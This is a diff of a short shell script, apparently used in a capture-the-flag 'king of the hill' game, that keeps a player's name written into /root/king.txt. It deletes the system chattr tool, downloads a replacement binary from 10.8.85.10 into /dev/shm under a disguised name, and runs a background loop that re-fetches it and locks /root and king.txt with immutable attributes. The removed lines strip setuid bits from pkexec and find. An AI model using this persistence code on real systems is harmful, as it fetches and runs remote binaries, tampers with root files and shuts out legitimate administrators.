@@ -1,19 +1,22 @@
-chmod -s /usr/bin/pkexec
-chmod -s $(which find)
-mv $(which chattr) /tmp/persistence
+rm $(which chattr)
+cd /dev/shm
+wget 10.8.85.10/chattr
+mv chattr asd
+chmod +x asd
 while true; do
-     if ls -l /tmp/persistence
+     if ls -l /dev/shm/asd
           then
                echo OK
           else
+               cd /dev/shm
           	wget 10.8.85.10/chattr
-          	mv chattr /tmp/persistence
-          	chmod +x /tmp/persistence
+          	mv chattr /dev/shm/asd
+          	chmod +x /dev/shm/asd
           	echo DONE
      fi
-     /tmp/persistence -ia /root
-     /tmp/persistence -ia /root/king.txt 2>/dev/null
+     /dev/shm/asd -ia /root
+     /dev/shm/asd -ia /root/king.txt 2>/dev/null
      echo -n "lomarkomar" >| /root/king.txt 2>/dev/null
-     /tmp/persistence +ia /root/king.txt 2>/dev/null
-     /tmp/persistence +ia /root
+     /dev/shm/asd +ia /root/king.txt 2>/dev/null
+     /dev/shm/asd +ia /root
 done &
